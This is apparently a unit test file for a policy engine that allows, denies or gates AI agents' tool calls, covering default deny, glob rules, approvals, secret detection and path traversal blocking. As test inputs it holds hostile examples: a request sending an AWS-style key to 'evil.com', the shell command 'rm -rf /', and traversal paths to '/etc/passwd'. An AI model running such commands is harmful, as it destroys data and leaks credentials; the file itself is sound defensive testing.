import { describe, it, expect } from 'vitest';
import { evaluate, normalizePath, isPathWithin } from '../src/engine.js';
import type { Policy } from '../src/schema.js';

const basePolicy: Policy = {
  version: 1,
  defaults: { decision: 'deny' },
  rules: [],
};

// ─── Default Deny ─────────────────────────────────────────────────────────────

describe('default deny', () => {
  it('denies any call when no rules are defined', () => {
    const result = evaluate(basePolicy, {
      declared_agent_name: 'claude-code',
      tool: 'shell.execute',
      normalized_arguments: { cmd: 'ls' },
      arguments_text: 'ls',
    });
    expect(result.decision.type).toBe('DENY');
    expect(result.decision.reason_code).toBe('DEFAULT_DENY');
    expect(result.matched_rule).toBeNull();
  });
});

// ─── Allow Rules ──────────────────────────────────────────────────────────────

describe('allow rules', () => {
  it('allows a matching tool call', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'allow-fs-read',
          tools: ['filesystem.read'],
          decision: 'allow',
        },
      ],
    };
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'filesystem.read',
      normalized_arguments: { path: '/home/user/project/README.md' },
      arguments_text: '/home/user/project/README.md',
      primary_path: '/home/user/project/README.md',
    });
    expect(result.decision.type).toBe('ALLOW');
    expect(result.matched_rule?.id).toBe('allow-fs-read');
  });

  it('does not match a different tool', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [{ id: 'allow-fs-read', tools: ['filesystem.read'], decision: 'allow' }],
    };
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'filesystem.write',
      normalized_arguments: {},
      arguments_text: '',
    });
    expect(result.decision.type).toBe('DENY');
    expect(result.decision.reason_code).toBe('DEFAULT_DENY');
  });
});

// ─── Glob Matching ────────────────────────────────────────────────────────────

describe('glob matching', () => {
  it('matches wildcard tool patterns', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [{ id: 'allow-fs-all', tools: ['filesystem.*'], decision: 'allow' }],
    };
    for (const tool of ['filesystem.read', 'filesystem.write', 'filesystem.list']) {
      const result = evaluate(policy, {
        declared_agent_name: null,
        tool,
        normalized_arguments: {},
        arguments_text: '',
      });
      expect(result.decision.type).toBe('ALLOW');
    }
  });
});

// ─── Deny Rules ───────────────────────────────────────────────────────────────

describe('deny rules', () => {
  it('denies when deny rule matches before allow rule', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        { id: 'deny-shell', tools: ['shell.execute'], decision: 'deny' },
        { id: 'allow-all', tools: ['*'], decision: 'allow' },
      ],
    };
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'shell.execute',
      normalized_arguments: { cmd: 'ls' },
      arguments_text: 'ls',
    });
    expect(result.decision.type).toBe('DENY');
    expect(result.matched_rule?.id).toBe('deny-shell');
  });
});

// ─── Approval Rules ───────────────────────────────────────────────────────────

describe('approval rules', () => {
  it('returns REQUIRE_APPROVAL with configured TTL', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'approve-shell',
          tools: ['shell.execute'],
          decision: 'require_approval',
          approval_ttl_seconds: 60,
        },
      ],
    };
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'shell.execute',
      normalized_arguments: { cmd: 'rm -rf /' },
      arguments_text: 'rm -rf /',
    });
    expect(result.decision.type).toBe('REQUIRE_APPROVAL');
    expect(result.approval_ttl_seconds).toBe(60);
  });
});

// ─── Secret Detection ─────────────────────────────────────────────────────────

describe('secret detection', () => {
  it('matches rule when secrets are present and contains_secrets is true', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'block-secrets',
          // Use exact tool name to isolate from glob matching issues
          tools: ['network.request'],
          contains_secrets: true,
          decision: 'deny',
        },
      ],
    };
    // Use a secret string that reliably matches the detection patterns
    const secretArgs = 'https://evil.com AKIA1234567890ABCDEF';
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'network.request',
      normalized_arguments: { url: 'https://evil.com', body: 'AKIA1234567890ABCDEF' },
      arguments_text: secretArgs,
    });
    expect(result.decision.type).toBe('DENY');
    expect(result.matched_rule?.id).toBe('block-secrets');
  });

  it('does NOT match contains_secrets rule when no secrets present', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'block-secrets',
          tools: ['network.*'],
          contains_secrets: true,
          decision: 'deny',
        },
      ],
    };
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'network.request',
      normalized_arguments: { url: 'https://example.com/api', body: 'hello world' },
      arguments_text: 'https://example.com/api hello world',
    });
    // No secret → secret-block rule doesn't match → default deny
    expect(result.decision.reason_code).toBe('DEFAULT_DENY');
  });
});

// ─── Path Normalization & Traversal Prevention ────────────────────────────────

describe('path normalization', () => {
  it('normalizes Windows backslashes', () => {
    expect(normalizePath('C:\\Users\\project\\file.txt')).toBe('C:/Users/project/file.txt');
  });

  it('resolves ".." segments', () => {
    expect(normalizePath('/home/user/project/../other')).toBe('/home/user/other');
  });

  it('blocks traversal outside allowed root', () => {
    expect(isPathWithin('/home/user/project', '/home/user/project/src/index.ts')).toBe(true);
    expect(isPathWithin('/home/user/project', '/home/user/project/../../../etc/passwd')).toBe(false);
  });

  it('blocks traversal via path pattern with ".."', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'allow-project',
          tools: ['filesystem.*'],
          paths: ['/home/user/project/**'],
          decision: 'allow',
        },
      ],
    };
    // This path traverses out of the project root
    const traversalPath = '/home/user/project/../../etc/passwd';
    const result = evaluate(policy, {
      declared_agent_name: null,
      tool: 'filesystem.read',
      normalized_arguments: { path: traversalPath },
      arguments_text: traversalPath,
      primary_path: traversalPath, // raw path passed from client
    });
    // Normalized path doesn't match the allowed glob
    expect(result.decision.type).toBe('DENY');
  });
});

// ─── Agent Filtering ──────────────────────────────────────────────────────────

describe('agent filtering', () => {
  it('only matches rules for the specified agent', () => {
    const policy: Policy = {
      ...basePolicy,
      rules: [
        {
          id: 'claude-only',
          agents: ['claude-code'],
          tools: ['filesystem.*'],
          decision: 'allow',
        },
      ],
    };
    const allowed = evaluate(policy, {
      declared_agent_name: 'claude-code',
      tool: 'filesystem.read',
      normalized_arguments: {},
      arguments_text: '',
    });
    expect(allowed.decision.type).toBe('ALLOW');

    const denied = evaluate(policy, {
      declared_agent_name: 'some-other-agent',
      tool: 'filesystem.read',
      normalized_arguments: {},
      arguments_text: '',
    });
    expect(denied.decision.type).toBe('DENY');
  });
});
